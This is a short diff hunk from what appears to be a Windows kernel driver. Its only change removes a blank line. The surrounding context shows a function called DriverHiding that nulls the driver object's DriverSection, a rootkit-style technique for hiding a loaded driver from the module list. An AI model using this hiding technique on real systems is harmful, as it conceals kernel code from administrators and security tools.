@@ -199,7 +199,6 @@ void DriverHiding(PDRIVER_OBJECT DriverObject) {
     KeDelayExecutionThread(KernelMode, FALSE, &times);
 
     DriverObject->DriverSection = NULL;
-
 }
 
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
